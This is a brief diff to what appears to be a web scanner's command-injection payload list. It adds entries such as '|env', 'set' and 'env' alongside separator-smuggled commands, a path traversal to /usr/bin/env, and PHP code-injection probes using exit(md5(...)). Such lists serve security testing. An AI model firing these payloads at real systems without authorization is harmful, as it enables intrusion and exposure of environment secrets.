@@ -1,10 +1,13 @@
 ;env;
+|env
 a;env;
 a);env;
 ../../../../../../../../../../../../../../../usr/bin/env|
 [VALUE];env;
 [VALUE][LF]env;
 &set&
+set
+env
 /e\0
 a;exit(md5('w4p1t1_md5'));//
 a;exit(md5('w4p1t1_md5'));#
